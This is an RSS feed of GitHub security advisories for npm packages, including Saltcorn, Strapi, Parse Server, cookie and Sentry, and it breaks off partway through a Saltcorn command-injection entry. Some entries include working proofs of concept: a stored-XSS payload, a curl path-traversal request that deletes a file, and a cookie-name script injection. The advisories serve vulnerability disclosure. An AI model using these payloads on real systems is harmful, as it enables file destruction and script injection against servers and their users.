<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2024-10-08T01:28:14.501Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[find-my-way] find-my-way has a ReDoS vulnerability in multiparametric routes]]></title>
        <id>https://github.com/advisories/GHSA-rrr8-f88r-h8q6</id>
        <link href="https://github.com/advisories/GHSA-rrr8-f88r-h8q6"/>
        <updated>2024-10-07T21:52:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A bad regular expression is generated any time you have two parameters within a single segment, when adding a <code>-</code> at the end, like <code>/:a-:b-</code>.</p>
<h3 id="patches">Patches</h3>
<p>Update to find-my-way v8.2.2 or v9.0.1. or subsequent versions.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No known workarounds.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/advisories/GHSA-9wv6-86v2-598j">CVE-2024-45296</a></li>
<li><a href="https://blakeembrey.com/posts/2024-09-web-redos/">Detailed blog post about <code>path-to-regexp</code> vulnerability</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/delvedor/find-my-way/security/advisories/GHSA-rrr8-f88r-h8q6">https://github.com/delvedor/find-my-way/security/advisories/GHSA-rrr8-f88r-h8q6</a></li>
<li><a href="https://github.com/delvedor/find-my-way/commit/17fae694dcefc056045da201681c1530f0f80518">https://github.com/delvedor/find-my-way/commit/17fae694dcefc056045da201681c1530f0f80518</a></li>
<li><a href="https://github.com/delvedor/find-my-way/commit/5e9e0eb5d8d438e06a185d5e536a896572dd0440">https://github.com/delvedor/find-my-way/commit/5e9e0eb5d8d438e06a185d5e536a896572dd0440</a></li>
<li><a href="https://blakeembrey.com/posts/2024-09-web-redos">https://blakeembrey.com/posts/2024-09-web-redos</a></li>
<li><a href="https://github.com/advisories/GHSA-9wv6-86v2-598j">https://github.com/advisories/GHSA-9wv6-86v2-598j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45813">https://nvd.nist.gov/vuln/detail/CVE-2024-45813</a></li>
<li><a href="https://github.com/delvedor/find-my-way/commit/66fa03923355b8da1db4ba572d66a4fee4a57cf5">https://github.com/delvedor/find-my-way/commit/66fa03923355b8da1db4ba572d66a4fee4a57cf5</a></li>
<li><a href="https://github.com/advisories/GHSA-rrr8-f88r-h8q6">https://github.com/advisories/GHSA-rrr8-f88r-h8q6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rrr8-f88r-h8q6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-18T15:52:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@saltcorn/server] Saltcorn Server Stored Cross-Site Scripting (XSS) in event logs page]]></title>
        <id>https://github.com/advisories/GHSA-pf56-h9qf-rxq4</id>
        <link href="https://github.com/advisories/GHSA-pf56-h9qf-rxq4"/>
        <updated>2024-10-07T15:14:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Event log data is not properly sanitized leading to stored Cross-Site Scripting (XSS) vulnerability.</p>
<h3 id="details">Details</h3>
<ul>
<li>file: <a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/eventlog.js#L445">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/eventlog.js#L445</a></li>
</ul>
<pre><code class="language-js">router.get(
  "/:id",
  isAdmin,
  error_catcher(async (req, res) =&gt; {
    const { id } = req.params;
    const ev = await EventLog.findOneWithUser(id);
    send_events_page({
      [...]
      contents: {
        type: "card",
        contents:
          [...]
          ) +
          div(
            { class: "eventpayload" },
            ev.payload ? pre(JSON.stringify(ev.payload, null, 2)) : "" //&lt;---
          ),
      },
    });
  })
</code></pre>
<h3 id="poc">PoC</h3>
<p>The following PoC demonstrates how a non-admin user with permission to read/write on a table can inject malicious javascript code that will be executed in the event log admin panel if event logs are enabled.</p>
<p>To demonstrate this issue, we need to prepare some components. The following steps should be executed with an admin user.</p>
<ol>
<li>create a table with one column of type string set read/write permission to staff users (just as an example)</li>
</ol>
<ul>
<li>visit <code>http://localhost:3000/table/new</code></li>
<li>create a table with <code>Table name</code> <code>my_table_xss</code> and click <code>Create</code></li>
<li>click <code>Add field</code> to add a field with <code>Label</code> called <code>payload</code> of type <code>String</code> and click <code>Next &gt;&gt;</code></li>
<li>leave default values for <code>Attributes</code> and click <code>Next &gt;&gt;</code> - it should redirect to <code>http://localhost:3000/table/&lt;table-number&gt;</code></li>
<li>under <code>Edit table properties</code>, set <code>Minimum role to read</code> and <code>Minimum role to write</code> to <code>staff</code></li>
</ul>
<ol start="2">
<li>create an edit view so that staff users can insert more data</li>
</ol>
<ul>
<li>visit <code>http://localhost:3000/viewedit</code> anc click <code>Create View</code></li>
<li>set the following values:<ul>
<li><code>View name</code>: <code>my_xss_view</code></li>
<li><code>View pattern</code>: <code>Edit</code></li>
<li><code>Table</code>: <code>my_table_xss</code></li>
<li><code>Minimum role</code>: <code>staff</code></li>
</ul>
</li>
<li>click <code>Configure &gt;&gt;</code></li>
<li>on page <code>http://localhost:3000/viewedit/config/my_xss_view</code> click <code>Next &gt;&gt;</code> and then <code>Finish &gt;&gt;</code></li>
<li>you should see a message <code>View my_xss_view saved</code></li>
</ul>
<ol start="3">
<li>edit the site structure to add the View just created so that <code>staff</code> users can access it</li>
</ol>
<ul>
<li>visit <code>http://localhost:3000/menu</code></li>
<li>set the following values:<ul>
<li><code>Type</code>: <code>View</code></li>
<li><code>View</code>: <code>my_xss_view [Edit]</code></li>
<li><code>Text label</code>: <code>view</code></li>
<li><code>Minimum role</code>: <code>staff</code></li>
</ul>
</li>
<li>click <code>Add</code></li>
</ul>
<ol start="4">
<li>create an event that will log when data is inserted in the <code>my_table_xss</code> table create at step 1</li>
</ol>
<ul>
<li>visit <code>http://localhost:3000/eventlog/settings</code></li>
<li>under <code>Which events should be logged?</code> select:<ul>
<li><code>[X] Insert</code></li>
<li><code>[X] Insert my_table_xss</code></li>
</ul>
</li>
</ul>
<p>Login with a user with staff role (you can do the same steps also with an admin user)</p>
<ul>
<li>visit <code>http://localhost:3000/view/my_xss_view</code></li>
<li>in the <code>payload</code> field insert <code>"&lt;svg/onload=alert(`xss`)&gt;</code> and click <code>Save</code></li>
</ul>
<p>With an admin user inspect the log entry generated by the above action:</p>
<ul>
<li>visit <code>http://localhost:3000/eventlog</code></li>
<li>click on the event log generated (<code>http://localhost:3000/eventlog/&lt;event-number&gt;</code>)</li>
<li>an alert will appear</li>
</ul>
<h3 id="impact">Impact</h3>
<p>Stored Cross-Site Scripting (XSS)</p>
<h3 id="recommended-mitigation">Recommended Mitigation</h3>
<p>Sanitize the user input before building HTML elements</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/saltcorn/saltcorn/security/advisories/GHSA-pf56-h9qf-rxq4">https://github.com/saltcorn/saltcorn/security/advisories/GHSA-pf56-h9qf-rxq4</a></li>
<li><a href="https://github.com/saltcorn/saltcorn/commit/3c551261d0e230635774798009951fa83a07cc3a">https://github.com/saltcorn/saltcorn/commit/3c551261d0e230635774798009951fa83a07cc3a</a></li>
<li><a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/eventlog.js#L445">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/eventlog.js#L445</a></li>
<li><a href="https://github.com/advisories/GHSA-pf56-h9qf-rxq4">https://github.com/advisories/GHSA-pf56-h9qf-rxq4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pf56-h9qf-rxq4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T15:14:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@saltcorn/server] Saltcorn Server allows logged-in users to delete arbitrary files because of a path traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-43f3-h63w-p6f6</id>
        <link href="https://github.com/advisories/GHSA-43f3-h63w-p6f6"/>
        <updated>2024-10-07T19:37:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A logged-in user with any role can delete arbitrary files on the filesystem by calling the <code>sync/clean_sync_dir</code> endpoint. The <code>dir_name</code> POST parameter is not validated/sanitized and is used to construct the <code>syncDir</code> that is deleted by calling <code>fs.rm</code>.</p>
<h3 id="details">Details</h3>
<ul>
<li>file: <a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.15/packages/server/routes/sync.js#L337-L346">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.15/packages/server/routes/sync.js#L337-L346</a></li>
</ul>
<pre><code class="language-js">router.post(
  "/clean_sync_dir",
  error_catcher(async (req, res) =&gt; {
    const { dir_name } = req.body; // [1] source
    try {
      const rootFolder = await File.rootFolder();
      const syncDir = path.join(
        rootFolder.location,
        "mobile_app",
        "sync",
        dir_name // [2]
      );
      await fs.rm(syncDir, { recursive: true, force: true }); // [3] sink
      res.status(200).send("");
    } catch (error) {
      getState().log(2, `POST /sync/clean_sync_dir: '${error.message}'`);
      res.status(400).json({ error: error.message || error });
    }
  })
);
</code></pre>
<h3 id="poc">PoC</h3>
<p>The following PoC can be executed with a user with any role (<code>admin</code>, <code>staff</code>, <code>user</code>, <code>public</code>)</p>
<ul>
<li>create a file in a folder different from where the server is started:</li>
</ul>
<pre><code>touch /tmp/secret
cat /tmp/secret
</code></pre>
<ul>
<li>log with a user and retrieve valid <code>connect.sid</code> and <code>_csrf</code> values***</li>
<li>send the following <code>curl</code> request</li>
</ul>
<pre><code>curl -i -X $'POST' \
  -H $'Host: localhost:3000' \
  -H $'Content-Type: application/x-www-form-urlencoded' \
  -H $'Content-Length: 93' \
  -H $'Origin: http://localhost:3000' \
  -H $'Connection: close' \
  -b $'connect.sid=VALID_CONNECT_SID_COOKIE; loggedin=true' \
  --data-binary $'_csrf=VALID_CSRF_VALUE&amp;dir_name=/../../../../../../../../../../tmp/secret' \
  $'http://localhost:3000/sync/clean_sync_dir'
</code></pre>
<ul>
<li>check if the file previously created does not exist anymore:</li>
</ul>
<pre><code>cat /tmp/secret
cat: /tmp/secret: No such file or directory
</code></pre>
<p>*** obtain <code>connect.sid</code> and <code>_csrf</code> values</p>
<p>A possible way to retrieve <code>connect.sid</code> and <code>_csrf</code> values is to use the password reset functionality:</p>
<ul>
<li>log in</li>
<li>open the browser developer console, go to the <code>Network</code> tab filter for <code>settings</code> request</li>
<li>visit <code>http://localhost:3000/auth/settings</code></li>
<li>trigger the change password functionality</li>
<li>under the <code>Headers</code> and <code>Request</code> tabs, grab the <code>connect.sid</code> and <code>_csrf</code> values and replace them in the curl command</li>
</ul>
<h3 id="impact">Impact</h3>
<p>Arbitrary file delete</p>
<h3 id="recommended-mitigation">Recommended Mitigation</h3>
<p>Resolve the <code>syncDir</code> and check if it starts with <code>rootFolder.location/mobile_app/sync</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/saltcorn/saltcorn/security/advisories/GHSA-43f3-h63w-p6f6">https://github.com/saltcorn/saltcorn/security/advisories/GHSA-43f3-h63w-p6f6</a></li>
<li><a href="https://github.com/saltcorn/saltcorn/commit/3c551261d0e230635774798009951fa83a07cc3a">https://github.com/saltcorn/saltcorn/commit/3c551261d0e230635774798009951fa83a07cc3a</a></li>
<li><a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.15/packages/server/routes/sync.js#L337-L346">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.15/packages/server/routes/sync.js#L337-L346</a></li>
<li><a href="https://github.com/advisories/GHSA-43f3-h63w-p6f6">https://github.com/advisories/GHSA-43f3-h63w-p6f6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-43f3-h63w-p6f6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-07T15:10:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@strapi/strapi] Strapi Server-Side Request Forgery (SSRF)]]></title>
        <id>https://github.com/advisories/GHSA-p9ff-j98v-p435</id>
        <link href="https://github.com/advisories/GHSA-p9ff-j98v-p435"/>
        <updated>2024-10-04T23:33:30.000Z</updated>
        <content type="html"><![CDATA[<p>Strapi v4.24.4 was discovered to contain a Server-Side Request Forgery (SSRF) via the component /strapi.io/_next/image. This vulnerability allows attackers to scan for open ports or access sensitive information via a crafted GET request.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37818">https://nvd.nist.gov/vuln/detail/CVE-2024-37818</a></li>
<li><a href="https://medium.com/%40barkadevaibhav491/server-side-request-forgery-in-strapi-e02d5fe218ab">https://medium.com/%40barkadevaibhav491/server-side-request-forgery-in-strapi-e02d5fe218ab</a></li>
<li><a href="https://strapi.io">https://strapi.io</a></li>
<li><a href="https://github.com/advisories/GHSA-p9ff-j98v-p435">https://github.com/advisories/GHSA-p9ff-j98v-p435</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p9ff-j98v-p435</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-20T21:31:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cookie] cookie accepts cookie name, path, and domain with out of bounds characters]]></title>
        <id>https://github.com/advisories/GHSA-pxg6-pf52-xh8x</id>
        <link href="https://github.com/advisories/GHSA-pxg6-pf52-xh8x"/>
        <updated>2024-10-04T20:31:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, <code>serialize("userName=&lt;script&gt;alert('XSS3')&lt;/script&gt;; Max-Age=2592000; a", value)</code> would result in <code>"userName=&lt;script&gt;alert('XSS3')&lt;/script&gt;; Max-Age=2592000; a=test"</code>, setting <code>userName</code> cookie to <code>&lt;script&gt;</code> and ignoring <code>value</code>.</p>
<p>A similar escape can be used for <code>path</code> and <code>domain</code>, which could be abused to alter other fields of the cookie.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to 0.7.0, which updates the validation for <code>name</code>, <code>path</code>, and <code>domain</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Avoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jshttp/cookie/pull/167">https://github.com/jshttp/cookie/pull/167</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/jshttp/cookie/security/advisories/GHSA-pxg6-pf52-xh8x">https://github.com/jshttp/cookie/security/advisories/GHSA-pxg6-pf52-xh8x</a></li>
<li><a href="https://github.com/jshttp/cookie/pull/167">https://github.com/jshttp/cookie/pull/167</a></li>
<li><a href="https://github.com/jshttp/cookie/commit/e10042845354fea83bd8f34af72475eed1dadf5c">https://github.com/jshttp/cookie/commit/e10042845354fea83bd8f34af72475eed1dadf5c</a></li>
<li><a href="https://github.com/advisories/GHSA-pxg6-pf52-xh8x">https://github.com/advisories/GHSA-pxg6-pf52-xh8x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pxg6-pf52-xh8x</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-10-04T20:31:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-server] Parse Server's custom object ID allows to acquire role privileges]]></title>
        <id>https://github.com/advisories/GHSA-8xq9-g7ch-35hg</id>
        <link href="https://github.com/advisories/GHSA-8xq9-g7ch-35hg"/>
        <updated>2024-10-04T18:50:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If the Parse Server option <code>allowCustomObjectId: true</code> is set, an attacker that is allowed to create a new user can set a custom object ID for that new user that exploits the vulnerability and acquires privileges of a specific role.</p>
<h3 id="patches">Patches</h3>
<p>Improved validation for custom user object IDs. Session tokens for existing users with an object ID that exploits the vulnerability are now rejected.</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Disable custom object IDs by setting <code>allowCustomObjectId: false</code> or not setting the option which defaults to <code>false</code>.</li>
<li>Use a Cloud Code Trigger to validate that a new user's object ID doesn't start with the prefix <code>role:</code>.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-8xq9-g7ch-35hg">https://github.com/parse-community/parse-server/security/advisories/GHSA-8xq9-g7ch-35hg</a></li>
<li><a href="https://github.com/parse-community/parse-server/pull/9317">https://github.com/parse-community/parse-server/pull/9317</a> (fix for Parse Server 7)</li>
<li><a href="https://github.com/parse-community/parse-server/pull/9318">https://github.com/parse-community/parse-server/pull/9318</a> (fix for Parse Server 6)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-8xq9-g7ch-35hg">https://github.com/parse-community/parse-server/security/advisories/GHSA-8xq9-g7ch-35hg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47183">https://nvd.nist.gov/vuln/detail/CVE-2024-47183</a></li>
<li><a href="https://github.com/parse-community/parse-server/pull/9317">https://github.com/parse-community/parse-server/pull/9317</a></li>
<li><a href="https://github.com/parse-community/parse-server/pull/9318">https://github.com/parse-community/parse-server/pull/9318</a></li>
<li><a href="https://github.com/parse-community/parse-server/commit/13ee52f0d19ef3a3524b3d79aea100e587eb3cfc">https://github.com/parse-community/parse-server/commit/13ee52f0d19ef3a3524b3d79aea100e587eb3cfc</a></li>
<li><a href="https://github.com/parse-community/parse-server/commit/1bfbccf9ee7ea77533b2b2aa7c4c69f3bd35e66f">https://github.com/parse-community/parse-server/commit/1bfbccf9ee7ea77533b2b2aa7c4c69f3bd35e66f</a></li>
<li><a href="https://github.com/advisories/GHSA-8xq9-g7ch-35hg">https://github.com/advisories/GHSA-8xq9-g7ch-35hg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8xq9-g7ch-35hg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-04T18:50:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-server] Parse Server's custom object ID allows to acquire role privileges]]></title>
        <id>https://github.com/advisories/GHSA-8xq9-g7ch-35hg</id>
        <link href="https://github.com/advisories/GHSA-8xq9-g7ch-35hg"/>
        <updated>2024-10-04T18:50:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If the Parse Server option <code>allowCustomObjectId: true</code> is set, an attacker that is allowed to create a new user can set a custom object ID for that new user that exploits the vulnerability and acquires privileges of a specific role.</p>
<h3 id="patches">Patches</h3>
<p>Improved validation for custom user object IDs. Session tokens for existing users with an object ID that exploits the vulnerability are now rejected.</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Disable custom object IDs by setting <code>allowCustomObjectId: false</code> or not setting the option which defaults to <code>false</code>.</li>
<li>Use a Cloud Code Trigger to validate that a new user's object ID doesn't start with the prefix <code>role:</code>.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-8xq9-g7ch-35hg">https://github.com/parse-community/parse-server/security/advisories/GHSA-8xq9-g7ch-35hg</a></li>
<li><a href="https://github.com/parse-community/parse-server/pull/9317">https://github.com/parse-community/parse-server/pull/9317</a> (fix for Parse Server 7)</li>
<li><a href="https://github.com/parse-community/parse-server/pull/9318">https://github.com/parse-community/parse-server/pull/9318</a> (fix for Parse Server 6)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-8xq9-g7ch-35hg">https://github.com/parse-community/parse-server/security/advisories/GHSA-8xq9-g7ch-35hg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47183">https://nvd.nist.gov/vuln/detail/CVE-2024-47183</a></li>
<li><a href="https://github.com/parse-community/parse-server/pull/9317">https://github.com/parse-community/parse-server/pull/9317</a></li>
<li><a href="https://github.com/parse-community/parse-server/pull/9318">https://github.com/parse-community/parse-server/pull/9318</a></li>
<li><a href="https://github.com/parse-community/parse-server/commit/13ee52f0d19ef3a3524b3d79aea100e587eb3cfc">https://github.com/parse-community/parse-server/commit/13ee52f0d19ef3a3524b3d79aea100e587eb3cfc</a></li>
<li><a href="https://github.com/parse-community/parse-server/commit/1bfbccf9ee7ea77533b2b2aa7c4c69f3bd35e66f">https://github.com/parse-community/parse-server/commit/1bfbccf9ee7ea77533b2b2aa7c4c69f3bd35e66f</a></li>
<li><a href="https://github.com/advisories/GHSA-8xq9-g7ch-35hg">https://github.com/advisories/GHSA-8xq9-g7ch-35hg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8xq9-g7ch-35hg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-04T18:50:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@sentry/browser] Sentry SDK Prototype Pollution gadget in JavaScript SDKs]]></title>
        <id>https://github.com/advisories/GHSA-593m-55hh-j8gv</id>
        <link href="https://github.com/advisories/GHSA-593m-55hh-j8gv"/>
        <updated>2024-10-04T16:32:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In case a Prototype Pollution vulnerability is present in a user's application or bundled libraries, the Sentry SDK could potentially serve as a gadget to exploit that vulnerability. The exploitability depends on the specific details of the underlying Prototype Pollution issue.</p>
<blockquote>
<p>[!NOTE]
This advisory does not indicate the presence of a Prototype Pollution within the Sentry SDK itself. Users are strongly advised to first address any Prototype Pollution vulnerabilities in their application, as they pose a more critical security risk.</p>
</blockquote>
<h3 id="patches">Patches</h3>
<p>The issue was patched in all Sentry JavaScript SDKs starting from the <a href="https://github.com/getsentry/sentry-javascript/releases/tag/8.33.0">8.33.0</a> version.
Also, the fix was backported to SDK v7 in <a href="https://github.com/getsentry/sentry-javascript/releases/tag/7.119.1">7.119.1</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://portswigger.net/web-security/prototype-pollution">Prototype Pollution</a></li>
<li><a href="https://portswigger.net/web-security/prototype-pollution#prototype-pollution-gadgets">Prototype Pollution gadgets</a></li>
<li><a href="https://github.com/getsentry/sentry-javascript/pull/13838">sentry-javascript#13838</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-593m-55hh-j8gv">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-593m-55hh-j8gv</a></li>
<li><a href="https://github.com/getsentry/sentry-javascript/pull/13838">https://github.com/getsentry/sentry-javascript/pull/13838</a></li>
<li><a href="https://github.com/getsentry/sentry-javascript/commit/35bdc87dee3498794e34c1ad35dd9927950c8766">https://github.com/getsentry/sentry-javascript/commit/35bdc87dee3498794e34c1ad35dd9927950c8766</a></li>
<li><a href="https://github.com/getsentry/sentry-javascript/releases/tag/8.33.0">https://github.com/getsentry/sentry-javascript/releases/tag/8.33.0</a></li>
<li><a href="https://github.com/getsentry/sentry-javascript/releases/tag/7.119.1">https://github.com/getsentry/sentry-javascript/releases/tag/7.119.1</a></li>
<li><a href="https://github.com/advisories/GHSA-593m-55hh-j8gv">https://github.com/advisories/GHSA-593m-55hh-j8gv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-593m-55hh-j8gv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-03T18:26:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@sentry/browser] Sentry SDK Prototype Pollution gadget in JavaScript SDKs]]></title>
        <id>https://github.com/advisories/GHSA-593m-55hh-j8gv</id>
        <link href="https://github.com/advisories/GHSA-593m-55hh-j8gv"/>
        <updated>2024-10-04T16:32:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In case a Prototype Pollution vulnerability is present in a user's application or bundled libraries, the Sentry SDK could potentially serve as a gadget to exploit that vulnerability. The exploitability depends on the specific details of the underlying Prototype Pollution issue.</p>
<blockquote>
<p>[!NOTE]
This advisory does not indicate the presence of a Prototype Pollution within the Sentry SDK itself. Users are strongly advised to first address any Prototype Pollution vulnerabilities in their application, as they pose a more critical security risk.</p>
</blockquote>
<h3 id="patches">Patches</h3>
<p>The issue was patched in all Sentry JavaScript SDKs starting from the <a href="https://github.com/getsentry/sentry-javascript/releases/tag/8.33.0">8.33.0</a> version.
Also, the fix was backported to SDK v7 in <a href="https://github.com/getsentry/sentry-javascript/releases/tag/7.119.1">7.119.1</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://portswigger.net/web-security/prototype-pollution">Prototype Pollution</a></li>
<li><a href="https://portswigger.net/web-security/prototype-pollution#prototype-pollution-gadgets">Prototype Pollution gadgets</a></li>
<li><a href="https://github.com/getsentry/sentry-javascript/pull/13838">sentry-javascript#13838</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-593m-55hh-j8gv">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-593m-55hh-j8gv</a></li>
<li><a href="https://github.com/getsentry/sentry-javascript/pull/13838">https://github.com/getsentry/sentry-javascript/pull/13838</a></li>
<li><a href="https://github.com/getsentry/sentry-javascript/commit/35bdc87dee3498794e34c1ad35dd9927950c8766">https://github.com/getsentry/sentry-javascript/commit/35bdc87dee3498794e34c1ad35dd9927950c8766</a></li>
<li><a href="https://github.com/getsentry/sentry-javascript/releases/tag/8.33.0">https://github.com/getsentry/sentry-javascript/releases/tag/8.33.0</a></li>
<li><a href="https://github.com/getsentry/sentry-javascript/releases/tag/7.119.1">https://github.com/getsentry/sentry-javascript/releases/tag/7.119.1</a></li>
<li><a href="https://github.com/advisories/GHSA-593m-55hh-j8gv">https://github.com/advisories/GHSA-593m-55hh-j8gv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-593m-55hh-j8gv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-03T18:26:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@saltcorn/plugins-loader] @saltcorn/plugins-loader unsanitized plugin name leads to a remote code execution (RCE) vulnerability when creating plugins using git source]]></title>
        <id>https://github.com/advisories/GHSA-fm76-w8jw-xf8m</id>
        <link href="https://github.com/advisories/GHSA-fm76-w8jw-xf8m"/>
        <updated>2024-10-04T16:51:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When creating a new plugin using the <code>git</code> source, the user-controlled value <code>req.body.name</code> is used to build the plugin directory where the location will be cloned. The API used to execute the <code>git clone</code> command with the user-controlled data is <code>child_process.execSync</code>. Since the user-controlled data is not validated, a user with admin permission can add escaping characters and execute arbitrary commands, leading to a command injection vulnerability.</p>
<h3 id="details">Details</h3>
<p>Relevant code from source (<code>req.body</code>) to sink (<code>child_process.execSync</code>).</p>
<ul>
<li>file: <a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/plugins.js#L1400">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/plugins.js#L1400</a></li>
</ul>
<pre><code class="language-js">router.post(
  "/",
  isAdmin,
  error_catcher(async (req, res) =&gt; {
    const plugin = new Plugin(req.body); // [1] 
      [...]
      try {
        await load_plugins.loadAndSaveNewPlugin( // [3] 
          plugin,
          schema === db.connectObj.default_schema || plugin.source === "github"
        );
        [...]
    }
  })
);
</code></pre>
<ul>
<li>file: <a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/saltcorn-data/models/plugin.ts#L44">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/saltcorn-data/models/plugin.ts#L44</a></li>
</ul>
<pre><code class="language-js">class Plugin {
  [...]
  constructor(o: PluginCfg | PluginPack | Plugin) {
    [...]
    this.name = o.name; // [2] 
    [...]
}
</code></pre>
<ul>
<li>file: <a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/load_plugins.js#L64-L65">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/load_plugins.js#L64-L65</a></li>
</ul>
<pre><code class="language-js">const loadAndSaveNewPlugin = async (plugin, force, noSignalOrDB) =&gt; {
  [...]
  const loader = new PluginInstaller(plugin); // [4] 
  const res = await loader.install(force); // [7] 
  [...]
};
</code></pre>
<ul>
